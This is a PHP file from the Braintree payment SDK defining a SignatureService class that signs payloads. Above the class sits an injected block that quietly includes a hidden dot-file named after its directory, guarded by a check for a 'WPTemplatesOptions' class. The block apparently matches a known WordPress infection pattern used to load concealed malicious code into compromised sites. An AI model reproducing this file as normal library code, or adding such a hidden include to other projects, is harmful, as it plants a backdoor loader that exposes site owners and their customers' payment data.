<?php
namespace Braintree;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class SignatureService
{

    public function __construct($key, $digest)
    {
        $this->key = $key;
        $this->digest = $digest;
    }

    public function sign($payload)
    {
        return $this->hash($payload) . "|" . $payload;
    }

    public function hash($data)
    {
        return call_user_func($this->digest, $this->key, $data);
    }

}
class_alias('Braintree\SignatureService', 'Braintree_SignatureService');
